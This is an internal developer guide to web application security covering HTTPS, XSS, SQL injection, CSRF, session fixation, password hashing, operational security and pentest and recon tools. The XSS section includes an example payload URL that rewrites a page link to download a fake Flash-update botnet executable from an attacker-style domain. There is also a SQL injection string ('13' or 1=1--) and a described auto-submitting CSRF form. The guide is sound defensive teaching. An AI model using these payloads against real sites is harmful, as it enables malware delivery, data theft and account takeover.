Originate Guides - Best Practices for App Security
========================

Hello! This document will give a general guideline on best practices in building a secure application as well as list and describe commonly used application exploits and how to defend against them.

First and foremost, **always enable HTTPS when in production!** It doesn't matter how well written and secure the code is if an attacker can just man-in-the-middle the connection and steal session cookies or inject malicious code.

**HTTPS (SSL/TLS)**

HTTPS is one of the most important inventions of the past two decades and is responsible for allowing the Internet to grow into the behemoth it is today. It lets users securely connect to servers without having to worry that someone might steal their data along the way. HTTPS _should_ be enabled by default on nearly every website by now as HTTP is inherently insecure but, unfortunately, as of [September 2014 only 30%](https://www.trustworthyinternet.org/ssl-pulse/) of the most popular websites have it.

HTTPS Guidelines

- If having site-wide HTTPS isn't feasible, at least have all connections to login and authenticated pages be over HTTPS.
  - Do not let the user log in over HTTP. Their username and password can be stolen while it's in-transit to the server if the connection isn't encrypted!
  - All pages post-login should also be delivered over HTTPS since an attacker can steal the user's authenticated session cookie if it's sent over an insecure connection.
- If the web application is powered by multiple servers that need to communicate with each other, it's recommended to encrypt the internal server connections as well either using SSL/TLS or some other transport layer security protocol. The [NSA](http://www.slate.com/blogs/future_tense/2013/10/30/nsa_smiley_face_muscular_spying_on_google_yahoo_speaks_volumes_about_agency.html) was able to sniff data sent between Google datacenters because the connection was unencrypted!
- Redirect users to the HTTPS version of pages if they try to visit the unencrypted version. This can be done with middleware outside your application.
- Do not link to HTTP content in a HTTPS page. An attacker can still intercept the unencrypted content and modify it for malicious purposes. (See section about XSS)
- While HTTPS encrypts everything past a URL's domain, it's still recommended to not have any sensitive data in the URL itself as it can leak out via referer headers.
- Implement [HTTP Strict Transport Policy (HSTS)](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security) if possible
  - Policy that requires all clients (browsers) communicate with the server over HTTPS
- Mark cookies as [Secure and HttpOnly](https://en.wikipedia.org/wiki/HTTP_cookie#Secure_and_HttpOnly)
  - Cookies marked Secure will only be transmitted over HTTPS
  - Cookies marked HttpOnly will only be accessible over HTTP/HTTPS requests, meaning they can't be accessed using javascript

**Cross Site Scripting (XSS)**

XSS is a vulnerability in a web application that allows an attacker to inject client-side scripts (usually Javascript) into webpages that can be viewed by other users. At best, the website gets defaced. At worst, session cookies are stolen, accounts get hijacked, and the browser turns into a [zombie](http://www.pcworld.com/article/2045944/researcher-builds-botnetpowered-distributed-file-storage-system-using-javascript.html). It is still a prevalent attack in 2015, and according to a report by [whitehatsec](http://info.whitehatsec.com/rs/whitehatsecurity/images/statsreport2014-20140410.pdf) as of 2014 it is a significant issue across all languages. Some notable examples include:

 - Java (Web Applications): 57% of Java web app vulnerabilities are XSS
 - Perl (CGI): 67% of Perl web app vulnerabilities are XSS
 - PHP: 56% of PHP web app vulnerabilities are XSS
 - ASP: 49% of ASP web app vulnerabilities are XSS

**Non-Persistent**

Non-persistent XSS is the single most commonly performed XSS attack to date.

Non-persistent XSS is carried out by getting a website to execute attacker-controlled code on the victim's browser. For this reason it is also known as "reflected XSS", because the site simply reflects the attacker-controlled code onto the user's browser. Non-persistent XSS is different than other forms of XSS in that non-persistent XSS does not store the payload anywhere. It is sent without the user knowing (usually through a doctored URL) and the payload is returned in the HTML response.

Typically a hacker will test the site for vulnerabilities with a fuzzer, or by hand testing various exposed parameters by manually trying to inject an alert such as `<script>alert("XSS works >:D");</script>`. Once the attacker has a working vector, a crafted URL can be made and masked using redirects on a site they control. From there, they can send the link (ex. "http://meet-singles-now.ru") and use social engineering to get a user to click on it. This is *very* common in modern spam, and is often time consuming to perform analysis on when it happens because the victim will likely not believe a site that "looks normal" could have attacked them.

Possible Attack Vectors

- Any site that is using endpoints with GET parameters that are inserted directly into the DOM is vulnerable to non-persistent XSS

Example Attack

In the below example, we will override an enticing link on a site we have determined to be vulnerable to download our botnet client. We will focus on attacking a Windows computer (because of the \*.exe), but a similar attack could be done on any system. Suppose the second link on the mysite login page is the login button. The exploited code shown below will download our botnet client to the user's computer. Since we're dealing with Windows in this example, we can add some additional testing code (not shown below) to test for common download locations on the users computer using ActiveX, and then use the Run method to run the executable.

- Normal: `http://mysite.com/login.php?username=angrygoats&startPage=1`
- Exploited: `http://mysite.com/login.php?username=<script>window.onload=function(){var mylinks=document.getElementsByTagName("a");mylinks[1].href="http://meet-singles-now.ru/flash_playerupdate.exe";}</script>`

Mitigation

- Always assume every parameter could be potentially compromised and validate accordingly
- Make sure to HTML encode any output to the screen, this way any tags that are displayed will be safe
- Regularly run web vulnerability scanners such as [Acunetix](http://www.acunetix.com/vulnerability-scanner/download/)


**Persistent**

Persistent XSS is similar to its non-persistent counterpart with the main difference being that the server saves and permanently displays malicious user data. This usually happens on insecure user profile pages or forum posts. Myspace was a shining example of the horrors of persistent XSS.

Possible Attack Vector

- Attacker puts script tags with malicious javascript in some persistently stored field
- Anybody who visits a page where that field is displayed has the malicious javascript executed

Mitigation

- Encode user input either before it's saved to the database or before it's placed into the DOM
- Most frontend frameworks (backbone.js, spine, etc.) have an option to encode data retrieved from the server before it's rendered so user data can be saved to the database unencoded as the encoding is handled on the frontend.

In addition to good coding practices, a [Content Security Policy (CSP)](https://en.wikipedia.org/wiki/Content_Security_Policy) can be implemented to add an extra layer of security against XSS and other data injection attacks. CSP is a relatively new W3C specification that allows the server to whitelist which resources (scripts, CSS, images, etc.) are allowed to be loaded by the browser as well as the source of those resources. Every major browser, except for Internet Explorer, supports CSP. You can read more about what CSP can do [here](https://www.owasp.org/index.php/Content_Security_Policy).

For more information on how to defend against XSS, read OWASP's [XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_&#40;Cross_Site_Scripting&#41;_Prevention_Cheat_Sheet).


**SQL Injections**

![Obligatory XKCD reference](http://i.imgur.com/gHNiJMY.png)


SQL injections aren't seen in the wild nearly as much as they used to be due to increased awareness on how to prevent them. But, in cases where SQL injections are found and exploited, the consequences can be much more serious than XSS. SQL injections occur when malicious user input is incorrectly filtered and then used to build a SQL query that is executed on the database.

Possible Attack Vector

(Fig 1) Consider the following string containing a SQL query
```
var query = "SELECT * FROM users WHERE id = '"+ userId + "'";
```
(Fig 2) An attacker submits the following as their _userId_
```
13' or 1=1--
```
The user input gets inserted into the query and executed as
```
SELECT * FROM users WHERE id = '13' or 1=1—-
```
Now, instead of just returning a single user, the database has given the attacker access to the entire users table!


Mitigation

- Prepared Statements

  Also known as _Parameterized Queries_, prepared statements separate the code (Fig 1) from the data (Fig 2) so the server never executes the portion of the query designated as data. In the above example, if prepared statements were used then the server would literally search for an id of ```13 or 1=1--``` instead of evaluating and executing it as part of the query.

  -  How does it work?

     First, the query is written with placeholders (usually a '?') being used where user-given data would normally be present. That query will then be sent to the database where it waits for the placeholders to be replaced before executing. Now, data can be bound to the placeholders and a second request is sent to the database with the data. The database knows the second request contains **only** data and will never execute it as a query.

- Stored Procedures

  Stored procedures are similar to prepared statements in that the SQL queries are defined and separated from the data. The main difference between the two is that queries in stored procedures are, as per their namesake, stored in the database. An application can call these procedures and send the data without first building a string with placeholders like in prepared statements.

  Prepared statements and stored procedures are supported by all major databases and languages. Look them up and learn how to use them before doing anything database-related.


- Database Libraries

  With a database library there's no need to directly write SQL queries. Using a library that handles turning function calls and objects into queries will be smart enough to protect against malicious input like ```13 or 1=1--``` by searching for that literal string instead of treating it as part of the query. [Slick](http://slick.typesafe.com/) for Scala is one such library.




**Cross Site Request Forgery (CSRF)**

Cross Site Request Forgery is used by an attacker to trick users into performing actions on a website that they're currently not browsing. This happens when the application server trusts the user's browser and doesn't check to make sure the request came from a trusted source. Attackers can abuse this trust by crafting requests that match legitimate requests that would be made by an actual user on the web app.

Possible Attack Vector

- A banking website has an endpoint that handles sending funds from the user's account
  - POST /user/send
  - The endpoint expects to receive the values "recipient" and "amount" which designate which account the funds are to be sent to and how much.
- The website has an HTML form that lets users fill in an amount and a user to send money to
- An attacker builds a webpage with a hidden HTML form that's submitted automatically when the page loads
  - The hidden form POSTs to /user/send with "recipient" set to the attacker's account and "amount" to 9001
- The attacker sends a link to their malicious webpage to a victim.
- The victim visits the webpage and the form is submitted silently in the background with the user's authorization cookies
- The bank server receives the request to send $9001 to the attacker's account, validates the cookies, and performs the transaction

Because the victim was logged in to the banking website, their cookies and any other identifying information got sent to the banking server when the form was submitted. The server had no idea the request came from a malicious webpage and since the authentication cookies checked out, the request was assumed to be legitimate and funds were sent to the attacker's account.

CSRF can be combined with XSS where javascript is injected into a page to submit valid requests on the user's behalf without their knowledge.

Mitigation

- Check the HTTP referer header to make sure the request came from a trusted page
- Add a CSRF-token [(nonce)](https://en.wikipedia.org/wiki/Cryptographic_nonce) as a hidden field when rendering all HTML forms
  - The nonce gets sent to the server and validated before processing the rest of the form submission
  - The token should only be used once per form
  - The token can also be set as a cookie by the server and then, using javascript, added as a custom HTTP header that's sent back to the server on each request

**Authentication and Session Management**

**Session Hijacking**

Session hijacking is when an attacker is able to get a copy of a user's session identifier, allowing them to impersonate that user.

Possible Attack Vector

- Connection between the server and the user is unencrypted
- An attacker is able to eavesdrop on the connection and read the session id
- The attacker uses the session id to impersonate the user

Mitigation

- There are a lot of different vectors through which a session can be hijacked. It's a symptom of an insecure app, rather than a cause. Generally, the most common way for account sessions to be stolen is through an insecure communication channel or because of XSS. Remember to always enable HTTPS and to sanitize all user-submitted data.

**Session Fixation**

Session fixation is a clever way to "steal" a user's session. Instead of getting a copy of a user's session identifier, an attacker would instead get a valid session by authenticating into their own account. They would then have a victim authenticate themselves using the attacker's session identifier. If the server doesn't create a new session upon authentication, the attacker will gain access to the victim's account.

Possible Attack Vector

- There is an XSS vulnerability in a web app
- An attacker exploits this to change the victim's session cookie to one that's known by the attacker
- The victim gets logged out and tries to log back in using the compromised session cookie
- The victim logs in and the server associates the compromised session with the victim's account
- The attacker now has access to the victim's authenticated session

Mitigation

- There are several other attack vectors depending on how the web app is set up, including intercepting the connection and changing the session cookie value in the header or crafting a malicious url with a compromised session id in it. An easy way to prevent all this is to just create and set a new session token every time a user logs in. Of course, if the web app is vulnerable to XSS or a man-in-the-middle attack, there are bigger things to worry about. :^)
- Other mitigation tips
  - **Always enable HTTPS when in production!**
  - Don't send session identifiers in form data or in the URL. Instead, store them as cookies and mark them as HttpOnly and Secure.
  - Time-out sessions after a certain amount of time and invalidate them.
  - Identity Confirmation
    - Require the user to authenticate again when doing anything "critical."
  - Reminder: **Always enable HTTPS when in production!**

**Doing Authentication (with and without OAuth)**

There usually are libraries and features bundled into frameworks that handle authentication but sometimes you may need to roll your own. Whether you're using Oauth or writing your own, the two most important things to remember are 1) **Always enable HTTPS in production**, and 2) **Use cryptographically strong hash functions** .

Authentication Basics w/o OAuth

- For each user, the server stores a [salt](https://en.wikipedia.org/wiki/Salt_(cryptography)) and the [hash](https://en.wikipedia.org/wiki/Cryptographic_hash_function) of the user's password with that salt
- The user sends their login information to the server through an encrypted connection
- The server computes a hash using the submitted password and the stored salt
- If the computed hash is equal to the stored hash then the user is authenticated

Authentication Basics w/ OAuth

- For each user, the server does not receive or store any sensitive information (passwords)
- The user authenticates through an OAuth provider (Google, Facebook, etc.) and the user receives an Access Token
- The user sends that access token to the server through an encrypted connection and the server uses that token to get the user's info from the OAuth provider
- If the token works and the user is valid, then the user is authenticated

Notes:

Do not store the access token. It's not necessary and poses an unnecessary risk as the user can just send a new one in the future if needed. Refer to each provider's documentation on how to implement OAuth as they each do things slightly differently.

Why Salt & Hash?

![Salty hash](http://i.imgur.com/fGLtPpM.jpg)

Always prepare for the worst. Assume the database is going get leaked eventually. If user passwords are stored in plaintext (as-is) or hashed using a weak hash function, it's trivial for the attacker to get users' passwords — passwords they probably use on other websites aside from yours.

Appending a salt to your users' passwords before hashing will, with a high degree of certainty, prevent duplicate passwords for different users from having the same hash. Salting also prevents attackers from using [rainbow tables](https://en.wikipedia.org/wiki/Rainbow_table) to quickly look-up the plaintext that the hash was derived from and forces them to either spend lots of time/money bruteforcing the hash or just give up entirely.

Choosing a Hash Function

- Slower is actually better
  - We want the hash computation to be slow for an attacker, but not too slow for the server
- With the rise of GPU computing, SHA-family hash functions can be computed much faster by the average user
- [Bcrypt](https://en.wikipedia.org/wiki/Bcrypt) was made to slow down GPU-based bruteforce attacks, but requires very little RAM which lets it be quickly computed using dedicated hardware like ASICs or FPGAs
  - Bcrypt is the most popular and is the most widely used
- [Scrypt](https://en.wikipedia.org/wiki/Scrypt) is a relatively new hash function that's similar to bcrypt but was designed specifically to make it more costly to bruteforce on dedicated hardware by having larger RAM requirements
  - Scrypt is still young (~2 years old) and in the world of cryptography, older time-tested and peer reviewed algorithms are preferred
- Don't use old, deprecated hash functions like MD5 or SHA1 anymore

Like with most things in security, use popular peer-reviewed crypto libraries written by people that do cryptography full-time. Do **NOT** implement any algorithms yourself. And do not ever, **ever** , **EVER** write your own encryption/hashing algorithms!!!


**Crypto Libraries**

- Scala/Play Framework
  - [Scala-bcrypt](https://github.com/t3hnar/scala-bcrypt) (Scala wrapper for jBcrypt)
  - [Crypto](https://www.playframework.com/documentation/2.3.0/api/java/play/libs/Crypto.html) (Included crypto library in Play Framework)
- Ruby
  - [bcrypt-ruby](https://rubygems.org/gems/bcrypt-ruby) (Ruby wrapper for bcrypt)
  - [Symmetric-encryption](https://github.com/reidmorrison/symmetric-encryption) (Symmetric encryption gem using OpenSSL)
- NodeJS
  - [Crypto](http://nodejs.org/api/crypto.html) (Included crypto module for NodeJS)


**Operational Security**

The most insecure component in any application exists between the keyboard and the chair. The chair is optional depending on how _hip_ your office is.

![Hip Web 3.0 Company](http://i.imgur.com/tVyMDaX.png)

Unfortunately, everybody at the New York office uses chairs.


Here are some tips and best practices in securing the project you're working on from yourself.

- Make sure any frameworks and libraries being used are configured correctly. If a component is being switched out make sure the replacement passes functional **AND** security requirements.
- Delete test accounts before going into production
- Make sure sensitive files aren't stored in publically accessible directories
- Use strong passwords
  - Preferably randomly generated with letters, numbers, and other characters
- Try not to use public personal information to secure anything (i.e. using your dog's name as the answer to a secret question and your dog's name is on Facebook)
  - Don't assume information about your personal life or relationships is private enough to only be known by you. It's 2016.
  - Do not talk about the specifics of a project on social media. Improper disclosure of technologies used may give an attacker enough information to exploit it.
  - If you own a domain name, purchase [whois protection](https://en.wikipedia.org/wiki/Domain_privacy). Whois records are a publically accessible treasure trove of personal information that includes your name, address, and phone number.
  - See the “Recon Tools” section below and see how much personal information you can dig up about yourself.
- Make sure not to check in any private keys or other sensitive information to a 3rd party source control service. (Or preferably, any source control)
- Follow standards. They're standards for a reason!

Admittedly, having good operational security can be tough sometimes – we’re all human and mistakes can happen. If you don’t think you can follow these best practices, especially if it would have you too pressed for time, try to find someone who can to help out or take over for you instead. Don’t be shy and bring up any concerns you have with your PM.

**Useful Tools**

Web Application Penetration Testing Tools

- Pentesting Suites
  - [Burp Suite](http://portswigger.net/burp/)
  - [OWASP ZAP](https://www.owasp.org/index.php/OWASP_Zed_Attack_Proxy_Project)
  - Both Burp and ZAP are pretty identical in their feature sets – and there are a lot. The most useful feature though would probably be the proxy that lets you view and modify data sent between the client and server in real time.

- SQL Injection
  - [sqlmap](http://sqlmap.org/)
  - Very useful tool to automatically try all form fields in a web app to look for SQL injection vulnerabilities

- Cookies
  - [Edit This Cookie](https://chrome.google.com/webstore/unsupported/fngmhnnpilhplaeedifhccceomclgfbg?hl=en) (Chrome)
    - Quick and easy way to edit cookies in Chrome
  - [Tamper Data](https://addons.mozilla.org/en-US/firefox/addon/tamper-data/) (Firefox)
    - Can edit cookies (and more!)

Directory Bruteforcing Tools

- Bruteforce-find subdomains
  - [Subbrute](https://github.com/TheRook/subbrute)
- Bruteforce-find directories and files
  - [OWASP DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project)

Recon Tools

- [Creepy](https://ilektrojohn.github.io/creepy/) (aka Cree.py)
  - An open source intelligence gathering tool that tracks a person's geolocation by searching through their social media
- [Maltego](https://www.paterva.com/web6/)
  - Used for analyzing and visually presenting relationships between people, groups, websites, and other affiliations
- [EDGAR Database](https://www.sec.gov/edgar.shtml)
  - The SEC has the filings for all foreign and domestic companies available for anyone to download
- [Google](https://www.google.com)
  - Just google them

Misc Tools

- Server SSL Configuration Test
  - [Qualys SSL Labs](https://www.ssllabs.com/ssltest/index.html)
- Vulnerability Databases
  - [U.S. National Vulnerability Database](https://web.nvd.nist.gov/view/vuln/search)
  - [CVE Details](http://www.cvedetails.com/)
- Password strength checkers
  - [Originate's Private Password Entropy Calculator](https://sites.google.com/a/originate.com/originate/it/password-entropy)
  - [Howsecureismypassword.net](https://howsecureismypassword.net/) (To be safe, don't type in your actual password)
